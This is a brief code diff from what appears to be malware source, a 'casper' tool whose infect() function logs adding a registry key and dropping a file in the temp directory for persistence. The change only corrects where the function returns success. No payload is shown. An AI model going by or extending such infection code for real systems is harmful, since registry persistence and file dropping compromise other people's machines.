@@ -29,8 +29,8 @@ def infect():
 		logging.debug("[casper] Dropping the file in temp directory")
 		if (drop() == True):
 			logging.debug("[casper] Finished registry infection")
+			return True
 		else:
 			logging.debug("[casper] Error while dropping file at temp directory")
 	else:
 		logging.debug("[casper] Error while adding registry key")
-	return True
